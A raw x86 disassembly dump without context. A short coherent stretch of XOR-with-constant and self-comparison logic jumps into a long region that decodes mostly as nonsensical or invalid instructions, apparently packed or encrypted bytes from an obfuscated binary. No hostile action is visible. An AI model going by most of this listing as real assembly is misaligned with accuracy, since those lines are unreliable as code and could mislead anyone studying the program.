  41c84b:	mov    edi,0xb9a74d4
  41c850:	pop    ss
  41c851:	inc    esp
  41c852:	test   eax,0xf35a3994
  41c857:	add    DWORD PTR [edi+eax*1+0x505d6757],ebp
  41c85e:	xchg   esp,eax
  41c85f:	sbb    al,0xd2
  41c861:	cdq    
  41c862:	pop    ds
  41c863:	inc    edi
  41c864:	in     al,0xb
  41c866:	or     esi,DWORD PTR fs:[ebx]
  41c869:	pop    ecx
  41c86a:	xor    al,0x20
  41c86c:	push   es
  41c86d:	adc    al,0x79
  41c86f:	adc    eax,0x387ed5eb
  41c874:	aas    
  41c875:	cld    
  41c876:	pop    edi
  41c877:	or     eax,0xd5174552
  41c87c:	rol    DWORD PTR [edi],cl
  41c87e:	ret    
  41c87f:	push   eax
  41c880:	add    dl,BYTE PTR ds:0xb48f8ab7
  41c886:	or     ebx,DWORD PTR [edi+edi*8]
  41c889:	je     0x41c8af
  41c88b:	je     0x41c88c
  41c88d:	je     0x41c8b3
  41c88f:	je     0x41c890
  41c891:	je     0x41c8b7
  41c893:	and    al,0xff
  41c895:	je     0x41c8bb
  41c897:	and    al,0xe8
  41c899:	imul   edx,DWORD PTR [ecx+0x548bffff],0x448b1824
  41c8a3:	and    al,0x1c
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	jmp    0x41c9af
  41c93d:	daa    
  41c93e:	stos   BYTE PTR es:[edi],al
  41c93f:	out    dx,eax
  41c940:	imul   edx,DWORD PTR [esi],0x18
  41c943:	mov    esp,0x38181812
  41c948:	je     0x41c9a0
  41c94a:	daa    
  41c94b:	cmp    ax,0xb4f3
  41c94f:	iret   
  41c950:	jo     0x41c996
  41c952:	ror    BYTE PTR [eax+0x3887a56d],1
  41c958:	jne    0x41c94a
  41c95a:	sub    DWORD PTR [esi-0x6c],ebx
  41c95d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c95e:	cmp    DWORD PTR [ecx+0x27],0x7fa324f2
  41c965:	fsub   st,st(1)
  41c967:	jns    0x41c9cf
  41c969:	or     dl,BYTE PTR [eax+edx*1]
  41c96c:	push   ebp
  41c96d:	ret    
  41c96e:	or     eax,0x924b4f8f
  41c973:	cmp    DWORD PTR [edx],0xdb655371
  41c979:	jmp    0xaf6d72b2
  41c97e:	jne    0x41c9ee
  41c980:	(bad)  
  41c981:	xor    al,0x5c
  41c983:	in     al,0xa
  41c985:	adc    eax,0xdcf534fe
  41c98a:	int3   
  41c98b:	stos   BYTE PTR es:[edi],al
  41c98c:	mov    ds:0x98e354ab,eax
  41c991:	mov    al,BYTE PTR ds:0xf357e72d
  41c997:	lea    ebx,[edx]
  41c999:	pop    edi
  41c99a:	ja     0x41c962
  41c99c:	arpl   WORD PTR [ebp+0x7e],sp
  41c99f:	pop    ebx
  41c9a0:	jno    0x41c923
  41c9a2:	into   
  41c9a3:	sar    eax,cl
  41c9a5:	enter  0x2316,0xa5
  41c9a9:	mov    edx,0xeede3025
  41c9ae:	sar    BYTE PTR [ebx],cl
  41c9b0:	jae    0x41c95c
  41c9b2:	sub    eax,0x9b478710
  41c9b7:	adc    al,0x1b
  41c9b9:	dec    ebx
  41c9ba:	lds    ecx,FWORD PTR [esi+0x376d202a]
  41c9c0:	sbb    al,0x93
  41c9c2:	das    
  41c9c3:	out    0xc9,al
  41c9c5:	xor    ch,BYTE PTR [ebp+0x22dae57f]
  41c9cb:	inc    ebx
  41c9cc:	loopne 0x41ca42
  41c9ce:	inc    esi
  41c9cf:	int3   
  41c9d0:	and    al,0x14
  41c9d2:	jne    0x41ca15
  41c9d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9d5:	jne    0x41c9c0
  41c9d7:	lods   eax,DWORD PTR ds:[esi]
  41c9d8:	or     esp,DWORD PTR [esi+0x6713c29d]
  41c9de:	lods   al,BYTE PTR ds:[esi]
  41c9df:	add    eax,0x3ffe35a6
  41c9e4:	or     DWORD PTR [esi+0x24],esp
  41c9e7:	jb     0x41c974
  41c9e9:	inc    ebp
  41c9ea:	lea    ecx,[ebp-0x7fbf852e]
  41c9f0:	nop
  41c9f1:	popa   
  41c9f2:	push   esi
  41c9f3:	mov    eax,esp
  41c9f5:	ret    0x4d9c
  41c9f8:	aad    0xbf
  41c9fa:	sahf   
  41c9fb:	xchg   ebx,eax
  41c9fc:	ss jo  0x41c9fe
  41c9ff:	add    ebx,DWORD PTR ds:0xe5b91eeb
  41ca05:	ret    
  41ca06:	imul   esp,DWORD PTR [ecx],0xffffffae
  41ca09:	ret    0xbab1
  41ca0c:	push   eax
  41ca0d:	mov    esp,DWORD PTR [ebx]
  41ca0f:	ss popa 
  41ca11:	retf   0xc5f2
  41ca14:	sbb    eax,0x4ace6fa8
  41ca19:	sub    DWORD PTR [ebp+0x7e27ba5f],ebp
  41ca1f:	aaa    
  41ca20:	adc    esp,DWORD PTR [esi]
  41ca22:	aam    0x4c
  41ca24:	rcr    BYTE PTR [esi],cl
  41ca26:	push   esp
  41ca27:	add    BYTE PTR cs:[edi-0x7158db81],dh
  41ca2e:	ret    0x732e
  41ca31:	pop    eax
  41ca32:	mov    al,ds:0xb59b40a7
  41ca37:	push   esp
  41ca38:	cli    
  41ca39:	repz mov cr3,eax
  41ca3d:	adc    eax,0xa524b94b
  41ca42:	add    eax,0x9cfa0723
  41ca47:	shl    DWORD PTR [esi+ecx*8],0xbc
  41ca4b:	jnp    0x41ca24
  41ca4d:	nop
  41ca4e:	data16 (bad) 
  41ca50:	repz bound esi,QWORD PTR [ecx]
  41ca53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca54:	stos   BYTE PTR es:[edi],al
  41ca55:	sub    bl,BYTE PTR [ecx+0x36]
  41ca58:	aam    0x3e
  41ca5a:	repz out 0x3d,al
  41ca5d:	add    BYTE PTR [esi+0x54c20c63],ah
  41ca63:	mov    ecx,esi
  41ca65:	aad    0x72
  41ca67:	fst    QWORD PTR [ebx-0x22]
  41ca6a:	jl     0x41ca77
  41ca6c:	(bad)  
  41ca6d:	adc    edi,DWORD PTR [edi]
  41ca6f:	das    
  41ca70:	mov    ds,WORD PTR [esp+ebp*4+0x4ac11835]
  41ca77:	addr16 cmc 
  41ca79:	test   dh,dl
  41ca7b:	jne    0x41ca3b
  41ca7d:	adc    DWORD PTR [ecx+0x2fd431ca],edx
  41ca83:	repz out 0x24,al
  41ca86:	test   al,0x3a
  41ca88:	lea    ebp,[edi+edi*8+0x750f81a6]
  41ca8f:	push   es
  41ca90:	add    eax,0x542d9aea
  41ca95:	outs   dx,DWORD PTR ds:[esi]
  41ca96:	rol    BYTE PTR [esi+0x6b044b2e],1
  41ca9c:	jmp    0x41ca91
  41ca9e:	sahf   
  41ca9f:	dec    edx
  41caa0:	mov    eax,0x2406b33e
  41caa5:	into   
  41caa6:	(bad)  
  41caa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41caa8:	xchg   ecx,eax
  41caa9:	dec    edx
  41caaa:	mov    al,0xdf
  41caac:	adc    al,0x60
  41caae:	je     0x41ca85
  41cab0:	sub    BYTE PTR [edx-0x4341011b],ch
  41cab6:	adc    al,0xd1
  41cab8:	inc    ebx
  41cab9:	sahf   
  41caba:	inc    esp
  41cabb:	dec    esi
  41cabc:	lods   al,BYTE PTR ds:[esi]
  41cabd:	push   esi
  41cabe:	data16 lahf 
  41cac0:	xchg   ecx,eax
  41cac1:	mov    ah,BYTE PTR [eax-0x7]
  41cac4:	mov    edi,0x3043c495
  41cac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41caca:	in     al,0x6a
  41cacc:	sbb    esp,DWORD PTR [edi-0x7d]
  41cacf:	push   ss
  41cad0:	dec    esi
  41cad1:	test   DWORD PTR [ecx-0x3e],edx
  41cad4:	sub    DWORD PTR [ebx+0xd768c88],edi
  41cada:	ficom  DWORD PTR [ebx]
  41cadc:	ja     0x41caa1
  41cade:	mov    bh,0xd0
  41cae0:	inc    eax
  41cae1:	icebp  
  41cae2:	inc    esi
  41cae3:	dec    ebx
  41cae4:	mov    bl,0xb0
  41cae6:	fs sub eax,0xfea7878e
  41caec:	push   ds
  41caed:	jne    0x41caf5
  41caef:	jg     0x41ca99
  41caf1:	pop    eax
  41caf2:	and    DWORD PTR [ebp-0x28fe8004],eax
  41caf8:	mov    ecx,0x699fd5d1
  41cafd:	inc    edx
  41cafe:	ror    BYTE PTR [eax+0x5e],1
  41cb01:	test   al,0x18
  41cb03:	es jae 0x41cb0a
  41cb06:	cmp    al,0x39
  41cb08:	sub    bl,BYTE PTR [ebx]
  41cb0a:	push   esp
  41cb0b:	inc    ebx
  41cb0c:	aaa    
  41cb0d:	cmp    dl,dh
  41cb0f:	add    edi,DWORD PTR [esi+0x43]
  41cb12:	mov    cl,0x58
  41cb14:	les    edi,FWORD PTR cs:[ebp+0x68ff6be5]
  41cb1b:	mov    edx,0x52126f90
  41cb20:	mov    ecx,0x4a4c98bf
  41cb25:	ja     0x41caf0
  41cb27:	jl     0x41cb2a
  41cb29:	jae    0x41cad1
  41cb2b:	lods   eax,DWORD PTR ds:[esi]
  41cb2c:	fnsave [ebp+0x75731434]
  41cb32:	mov    ebp,0xdea50517
  41cb37:	jb     0x41cb95
  41cb39:	iret   
  41cb3a:	test   DWORD PTR [edx-0x3205520c],edx
  41cb40:	jo     0x41cb8b
  41cb42:	mov    al,ds:0xcb3f74c
  41cb47:	(bad)  
  41cb48:	dec    esp
  41cb49:	popa   
  41cb4a:	jp     0x41cba2
  41cb4c:	dec    edx
  41cb4d:	loope  0x41cb17
  41cb4f:	loop   0x41cb3e
  41cb51:	test   DWORD PTR [ebx-0x63],ebp
  41cb54:	xor    dl,BYTE PTR [edx+0x4587b092]
  41cb5a:	iret   
  41cb5b:	add    DWORD PTR [eax+esi*1+0x4b6bd993],ebx
  41cb62:	js     0x41cb91
  41cb64:	stos   DWORD PTR es:[edi],eax
  41cb65:	aam    0xa2
  41cb67:	inc    esp
  41cb68:	jp     0x41cb2c
  41cb6a:	xchg   ebp,eax
  41cb6b:	mov    ds:0xa966b715,eax
  41cb70:	in     al,dx
  41cb71:	adc    al,0x25
  41cb73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb74:	retf   
  41cb75:	mov    al,ds:0x590fff1d
  41cb7a:	cdq    
  41cb7b:	repz sub BYTE PTR [ebx-0x4a],bl
  41cb7f:	pop    esi
  41cb80:	dec    ecx
  41cb81:	out    dx,eax
  41cb82:	adc    esp,DWORD PTR ds:0x3f053cc5
  41cb88:	pushf  
  41cb89:	mov    cl,0xb2
  41cb8b:	test   BYTE PTR [edi],0xb4
  41cb8e:	cdq    
  41cb8f:	cli    
  41cb90:	mov    fs,WORD PTR [edi-0x1a]
  41cb93:	mov    dh,0xb7
  41cb95:	hlt    
  41cb96:	cld    
  41cb97:	loopne 0x41cbf4
  41cb99:	mov    eax,es
  41cb9b:	adc    eax,0x84fa4983
  41cba0:	and    BYTE PTR [ecx],0x71
  41cba3:	cmp    ebx,ebp
  41cba5:	jmp    0x9006:0x2bbd6bf6
  41cbac:	shl    bh,0xf7
  41cbaf:	mov    ecx,cs
  41cbb1:	(bad)  
  41cbb2:	mov    ebx,0x3c6394fc
  41cbb7:	push   esp
  41cbb8:	aam    0xb8
  41cbba:	pushf  
  41cbbb:	in     al,0x13
  41cbbd:	push   ds
  41cbbe:	sub    DWORD PTR [ebx+0x3803b645],edx
  41cbc4:	pop    ds
  41cbc5:	fucomi st,st(0)
  41cbc7:	jecxz  0x41cb65
  41cbc9:	xchg   ebp,eax
  41cbca:	sbb    al,0xda
  41cbcc:	add    eax,0x53e9fc39
  41cbd1:	pop    es
  41cbd2:	sub    eax,0x3490c72c
  41cbd7:	shl    DWORD PTR [esi-0x5f],cl
  41cbda:	jo     0x41cb90
  41cbdc:	inc    ebp
  41cbdd:	pop    ebx
  41cbde:	and    al,0xf5
  41cbe0:	and    eax,0x9acda3f8
  41cbe5:	cmp    eax,0xb2ca77ae
  41cbea:	fs sti 
  41cbec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbed:	imul   edi,DWORD PTR [ebx-0x57],0x1e86003c
  41cbf4:	jno    0x41cb81
  41cbf6:	push   ecx
  41cbf7:	in     eax,dx
  41cbf8:	mov    ah,0xc9
  41cbfa:	jnp    0x41cbbe
  41cbfc:	lea    edi,[esi+0x5f538edf]
  41cc02:	mov    ds:0xd8060b87,eax
  41cc07:	cmp    eax,0x5cc02a74
  41cc0c:	ins    BYTE PTR es:[edi],dx
  41cc0d:	fnstsw WORD PTR [eax+0xd]
  41cc10:	push   ss
  41cc11:	scas   eax,DWORD PTR es:[edi]
  41cc12:	mov    edi,0x768851b3
  41cc17:	mov    ah,0xa6
  41cc19:	cld    
  41cc1a:	jg     0x41cb9e
  41cc1c:	xor    esp,0xe6bc36b7
  41cc22:	popa   
  41cc23:	jb     0x41cc40
  41cc25:	xchg   esp,ebp
  41cc27:	test   BYTE PTR [edi-0x60],bl
  41cc2a:	pushf  
  41cc2b:	pop    ebp
  41cc2c:	sbb    ebp,DWORD PTR [eax-0x7ca4f3bd]
  41cc32:	ins    DWORD PTR es:[edi],dx
  41cc33:	mov    ebp,0x4237ce44
  41cc38:	dec    esi
  41cc39:	cmp    edx,edx
  41cc3b:	cvtpi2ps xmm3,QWORD PTR [edx-0x4c]
  41cc3f:	sti    
  41cc40:	xchg   ebp,eax
  41cc41:	push   ds
  41cc42:	sub    eax,0x1a9cfdde
  41cc47:	or     DWORD PTR [eax],0xffffffe4
  41cc4a:	xlat   BYTE PTR ds:[ebx]
  41cc4b:	add    DWORD PTR [eax+0x1e],esp
  41cc4e:	enter  0x6ab2,0x6e
  41cc52:	out    dx,al
  41cc53:	test   al,0x48
  41cc55:	stos   BYTE PTR es:[edi],al
  41cc56:	cmp    BYTE PTR [ecx+0x74],dh
  41cc59:	mov    ebp,0x5a2a020f
  41cc5e:	pop    ss
  41cc5f:	jmp    DWORD PTR [esp+ebx*2-0xc6dfa44]
  41cc66:	xor    eax,0x80be38f1
  41cc6b:	stc    
  41cc6c:	leave  
  41cc6d:	xchg   ebx,eax
  41cc6e:	and    BYTE PTR [edi+esi*2],dl
  41cc71:	sub    BYTE PTR [edx],al
  41cc73:	out    0xb1,eax
  41cc75:	cli    
  41cc76:	enter  0x5654,0xd9
  41cc7a:	ins    DWORD PTR es:[edi],dx
  41cc7b:	lahf   
  41cc7c:	scas   al,BYTE PTR es:[edi]
  41cc7d:	retf   0xca90
  41cc80:	fs xor al,0x75
  41cc83:	add    eax,0xd01e9f90
  41cc88:	cli    
  41cc89:	js     0x41cc60
  41cc8b:	sbb    al,0x6e
  41cc8d:	rcl    BYTE PTR [edx-0x68],0xa3
  41cc91:	ss iret 
  41cc93:	nop
  41cc94:	daa    
  41cc95:	add    BYTE PTR [ebp+0x72],bh
  41cc98:	push   esi
  41cc99:	mov    esi,0x8ffbaeb
  41cc9e:	lock jle 0x41cc4d
  41cca1:	loopne 0x41cc97
  41cca3:	mov    edi,0x95de73c5
  41cca8:	jae    0x41cc9c
  41ccaa:	cmp    ebp,DWORD PTR [edx+0x12277dc6]
  41ccb0:	scas   eax,DWORD PTR es:[edi]
  41ccb1:	or     al,0xb0
  41ccb3:	cs stc 
  41ccb5:	inc    ebx
  41ccb6:	push   ecx
  41ccb7:	jmp    0x46fd:0xc58c532e
  41ccbe:	pop    ds
  41ccbf:	add    DWORD PTR [ebx],esp
  41ccc1:	sbb    dl,BYTE PTR [ecx+eax*8+0x55]
  41ccc5:	push   0xffffffb2
  41ccc7:	push   ebp
  41ccc8:	fadd   QWORD PTR [edi+0x12]
  41cccb:	mov    esp,0xb0cd52ff
  41ccd0:	lahf   
  41ccd1:	dec    edx
  41ccd2:	outs   dx,DWORD PTR ds:[si]
  41ccd4:	ficom  DWORD PTR [ebp+ebp*2-0x14ebf6ca]
  41ccdb:	fs add bl,al
  41ccde:	sti    
  41ccdf:	push   ecx
  41cce0:	push   esp
  41cce1:	mov    ebx,0xdef016ea
  41cce6:	pusha  
  41cce7:	add    esp,edx
  41cce9:	cld    
  41ccea:	xchg   ecx,eax
  41cceb:	jp     0x41ccb9
  41cced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccee:	pop    ecx
  41ccef:	cdq    
  41ccf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccf1:	pop    esp
  41ccf2:	fwait
  41ccf3:	or     BYTE PTR [ebp-0x19621321],0x8a
  41ccfa:	dec    esp
  41ccfb:	and    al,0x3c
  41ccfd:	or     al,0xdc
  41ccff:	jmp    0x41d0ce
  41cd04:	fimul  WORD PTR [esi+0x16]
  41cd07:	jle    0x41cd30
  41cd09:	ds pop esi
  41cd0b:	cs je  0x41cd75
  41cd0e:	xchg   edi,eax
  41cd0f:	mov    esp,0x7e212855
  41cd14:	xchg   ebx,eax
  41cd15:	arpl   WORD PTR [esi],dx
  41cd17:	sbb    BYTE PTR [edx+edx*1+0x1bcf1818],bh
  41cd1e:	div    DWORD PTR cs:[edi]
  41cd21:	cmp    dl,al
  41cd23:	push   esi
  41cd24:	fcmove st,st(0)
  41cd26:	cmp    eax,0x229d8ac3
  41cd2b:	das    
  41cd2c:	ds das 
  41cd2e:	pop    esi
  41cd2f:	outs   dx,BYTE PTR ds:[esi]
  41cd30:	(bad)  
  41cd31:	sbb    bl,BYTE PTR [eax+esi*2-0x317df8c5]
  41cd38:	sub    eax,0xf8fd3e81
  41cd3d:	xlat   BYTE PTR ds:[ebx]
  41cd3e:	sub    eax,0x9815ba7f
  41cd43:	sub    edx,esi
  41cd45:	push   ebx
  41cd46:	jge    0x41cda9
  41cd48:	stos   BYTE PTR es:[edi],al
  41cd49:	mov    cl,0x48
  41cd4b:	addr16 (bad) 
  41cd4d:	fnstsw WORD PTR [edi]
  41cd4f:	fdivr  QWORD PTR [ecx-0x46]
  41cd52:	push   0x6a
  41cd54:	mov    ah,0x2
  41cd56:	add    cl,BYTE PTR [eax]
  41cd58:	mov    ebx,0xdf8e0b42
  41cd5d:	sub    bh,BYTE PTR [ecx+0x3c733319]
  41cd63:	push   ebx
  41cd64:	mov    BYTE PTR [edi-0x47],al
  41cd67:	push   cs
  41cd68:	xchg   edi,eax
  41cd69:	push   cs
  41cd6a:	outs   dx,DWORD PTR ds:[esi]
  41cd6c:	scas   al,BYTE PTR es:[edi]
  41cd6d:	repnz loope 0x41cd9b
  41cd70:	pop    esp
  41cd71:	push   esi
  41cd72:	int    0x26
  41cd74:	xor    DWORD PTR [eax+0x7c],edi
  41cd77:	xor    eax,esp
  41cd79:	lock imul esp,DWORD PTR ds:0xf74d179d,0x39
  41cd81:	jg     0x41cda2
  41cd83:	jb     0x41cdc4
  41cd85:	mov    ecx,0xa88083ee
  41cd8a:	or     BYTE PTR ds:[ecx-0x6db67812],cl
  41cd91:	push   esp
  41cd92:	sahf   
  41cd93:	pop    eax
  41cd94:	or     bl,dh
  41cd96:	and    edi,edi
  41cd98:	inc    esp
  41cd99:	pop    ds
  41cd9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd9b:	sub    eax,0xf0d3d639
  41cda0:	mov    edi,0x6a5998f3
  41cda5:	cwde   
  41cda6:	sub    DWORD PTR [ebx-0x58],0xfffffff0
  41cdaa:	repz xor BYTE PTR [ebx+0x4f5d6070],0x39
  41cdb2:	jae    0x41cdb7
  41cdb4:	shl    cl,0x1d
  41cdb7:	test   esp,esp
  41cdb9:	push   ecx
  41cdba:	(bad)  
  41cdbc:	shr    DWORD PTR [ecx-0x48f15fd2],cl
  41cdc2:	popf   
  41cdc3:	jns    0x41ce09
  41cdc5:	str    WORD PTR [ebp+0x4d]
  41cdc9:	out    0x92,al
  41cdcb:	or     DWORD PTR [ecx+0x7],esi
  41cdce:	xchg   esi,eax
  41cdcf:	es push edx
  41cdd1:	sbb    bh,0x52
  41cdd4:	cmc    
  41cdd5:	pop    esi
  41cdd6:	ins    BYTE PTR es:[edi],dx
  41cdd7:	(bad)  
  41cdd8:	popa   
  41cdd9:	shr    BYTE PTR [ebp+0x57],0x90
  41cddd:	(bad)  [edx-0x68]
  41cde0:	sahf   
  41cde1:	scas   al,BYTE PTR es:[edi]
  41cde2:	pop    ds
  41cde3:	out    0x8e,al
  41cde5:	xchg   edi,eax
  41cde6:	leave  
  41cde7:	dec    ecx
  41cde8:	jns    0x41ce63
  41cdea:	push   ss
  41cdeb:	sub    al,0x37
  41cded:	(bad)  
  41cdee:	lods   eax,DWORD PTR ds:[esi]
  41cdef:	xchg   esp,eax
  41cdf0:	loope  0x41cda2
  41cdf2:	inc    esp
  41cdf3:	sbb    al,0x87
  41cdf5:	add    eax,0xfeef0080
  41cdfa:	enter  0xd3b3,0x44
  41cdfe:	sub    DWORD PTR [edx],ebp
  41ce00:	jmp    0xe96f:0x7ce7b15a
  41ce07:	inc    eax
  41ce08:	xchg   edi,eax
  41ce09:	test   BYTE PTR [ecx+0x40],al
  41ce0c:	xor    al,0x33
  41ce0e:	mov    cl,0x83
  41ce10:	jl     0x41cdcf
  41ce12:	cmp    al,0x63
  41ce14:	cs iret 
  41ce16:	fild   WORD PTR [ebx]
  41ce18:	inc    eax
  41ce19:	or     al,0xe5
  41ce1b:	lea    ebp,[ebx]
  41ce1d:	sub    DWORD PTR [eax+0x4cb51f4a],edi
  41ce23:	fiadd  WORD PTR [edx-0x36]
  41ce26:	lock lods al,BYTE PTR ds:[esi]
  41ce28:	inc    ebx
  41ce29:	sbb    eax,0xcde59e17
  41ce2e:	rol    DWORD PTR [edi+0x4bf98194],cl
  41ce34:	mov    bh,BYTE PTR [edi+0x690d1e08]
  41ce3a:	mov    ebx,0x660e96c0
  41ce3f:	ds fcmovne st,st(3)
  41ce42:	popf   
  41ce43:	(bad)
  41ce47:	pop    edi
  41ce48:	je     0x41cdd3
  41ce4a:	mov    ebx,0x5b530bd2
  41ce4f:	xchg   esp,eax
  41ce50:	add    ebp,eax
  41ce52:	pop    es
  41ce53:	push   ecx
  41ce54:	ffreep st(7)
  41ce56:	imul   ecx,DWORD PTR [ecx+edx*8],0xfffffff1
  41ce5a:	sub    dh,BYTE PTR [ecx]
  41ce5c:	mov    bl,0x99
  41ce5e:	or     DWORD PTR [ebx+0x52eb8f9a],0xffffffbe
  41ce65:	ins    BYTE PTR es:[edi],dx
  41ce66:	out    dx,eax
  41ce67:	ret    0xbce6
  41ce6a:	mov    ?,WORD PTR ds:0xe0df6890
  41ce70:	fst    DWORD PTR [ecx+0x29]
  41ce73:	arpl   WORD PTR [eax-0x29],dx
  41ce76:	mov    ch,0x1e
  41ce78:	(bad)  
  41ce79:	into   
  41ce7a:	shl    DWORD PTR [edx],cl
  41ce7c:	jmp    0x20b9:0x57904dec
  41ce83:	push   eax
  41ce84:	(bad)  ds:0x9f57d9b8
  41ce8a:	stc    
  41ce8b:	mov    eax,0xbf7b6efe
  41ce90:	mov    eax,0xf1d05339
  41ce95:	cmp    eax,0xe33b0c71
  41ce9a:	mov    dh,0x64
  41ce9c:	neg    BYTE PTR [ebx]
  41ce9e:	mov    BYTE PTR [edi+ebx*4+0x2a],cl
  41cea2:	fisttp WORD PTR [ecx+edi*1-0x1d]
  41cea6:	dec    ecx
  41cea7:	fisubr DWORD PTR [eax-0x48edb437]
  41cead:	xchg   edi,eax
  41ceae:	(bad)  
  41ceaf:	in     al,dx
  41ceb0:	mov    eax,ds:0x12a8f278
  41ceb5:	or     ch,BYTE PTR [ebx+0x670c695c]
  41cebb:	mov    ds:0xc3a571c,eax
  41cec0:	es jmp 0xd457779f
  41cec6:	mov    eax,ds:0x1e650bd4
  41cecb:	add    al,0x8
  41cecd:	test   BYTE PTR [eax-0x1e79f57b],dh
  41ced3:	pushf  
  41ced4:	xchg   edx,eax
  41ced5:	jmp    0x41cec1
  41ced7:	xchg   DWORD PTR [edx],esi
  41ced9:	fbstp  TBYTE PTR [ebx+0xa8344a0]
  41cedf:	jp     0x41cf03
  41cee1:	lods   eax,DWORD PTR ds:[esi]
  41cee2:	icebp  
  41cee3:	shl    DWORD PTR [ecx+edi*2+0x828d108],1
  41ceea:	iret   
  41ceeb:	dec    edx
  41ceec:	xlat   BYTE PTR ds:[ebx]
  41ceed:	mov    ecx,0x68d31296
  41cef2:	out    0xec,al
  41cef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cef5:	test   DWORD PTR [ebx],edx
  41cef7:	cmp    ecx,DWORD PTR [ebx+0x6f]
  41cefa:	(bad)  
  41cefb:	jle    0x41cebd
  41cefd:	(bad)  
  41cefe:	(bad)  
  41ceff:	sbb    dh,dl
  41cf01:	lods   eax,DWORD PTR ds:[esi]
  41cf02:	sub    al,BYTE PTR [edi+0x2a28b80a]
  41cf08:	xchg   esi,eax
  41cf09:	icebp  
  41cf0a:	arpl   ax,si
  41cf0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf0d:	stos   BYTE PTR es:[edi],al
  41cf0e:	std    
  41cf0f:	push   ebp
  41cf10:	push   ebx
  41cf11:	sbb    eax,0x7d61dec4
  41cf16:	mov    ds:0xc87e6a15,eax
  41cf1b:	das    
  41cf1c:	xor    ch,BYTE PTR [edx-0x18]
  41cf1f:	push   0x52f85caa
  41cf24:	inc    edx
  41cf25:	es mov cl,0x25
  41cf28:	ins    DWORD PTR es:[edi],dx
  41cf29:	xchg   edi,eax
  41cf2a:	stc    
  41cf2b:	(bad)  
  41cf2c:	xchg   esp,eax
  41cf2d:	cmp    esi,0xffffffd3
  41cf30:	sar    bl,1
  41cf32:	js     0x41cf3b
  41cf34:	and    al,0xa4
  41cf36:	sbb    ecx,edi
  41cf38:	call   0xec146be8
  41cf3d:	loop   0x41cf2a
  41cf3f:	lahf   
  41cf40:	pop    ecx
  41cf41:	fwait
  41cf42:	stos   BYTE PTR es:[edi],al
  41cf43:	pop    esi
  41cf44:	pop    es
  41cf45:	add    al,0xa7
  41cf47:	push   ebp
  41cf48:	mov    edx,0x6c7d8513
  41cf4d:	sub    eax,0x59acf68f
  41cf52:	data16 cmc 
  41cf54:	xchg   esp,eax
  41cf55:	mov    ds,WORD PTR [edi+0x772eea6b]
  41cf5b:	retf   0xc81
  41cf5e:	mov    ds:0xe863aa78,al
  41cf63:	imul   ebp,edi,0x92b4dcca
  41cf69:	xchg   edx,eax
  41cf6a:	mov    ebp,?
  41cf6c:	enter  0x4803,0xeb
  41cf70:	lock leave 
  41cf72:	in     eax,dx
  41cf73:	aaa    
  41cf74:	push   0x56
  41cf76:	das    
  41cf77:	mov    esp,0x4d4a5003
  41cf7c:	inc    eax
  41cf7d:	in     eax,dx
  41cf7e:	pop    esp
  41cf7f:	fldcw  WORD PTR [edi+0x38]
  41cf82:	cs stc 
  41cf84:	mov    dh,0xb1
  41cf86:	push   eax
  41cf87:	jle    0x41cf55
  41cf89:	in     al,dx
  41cf8a:	mov    cl,BYTE PTR [edx+0x6b]
  41cf8d:	ds js  0x41d00b
  41cf90:	cwde   
  41cf91:	pop    ebp
  41cf92:	push   edi
  41cf93:	mov    ebp,0xf4d0c5fa
  41cf98:	jnp    0x41cfc7
  41cf9a:	jbe    0x41cf5c
  41cf9c:	out    0x63,eax
  41cf9e:	and    eax,0xbcc8b0e0
  41cfa3:	in     eax,dx
  41cfa4:	sbb    DWORD PTR [ebx+eiz*4-0x398470c7],esi
  41cfab:	inc    edi
  41cfac:	in     eax,0xb3
  41cfae:	jbe    0x41cf95
  41cfb0:	shr    esi,1
  41cfb2:	lahf   
  41cfb3:	jae    0x41cf52
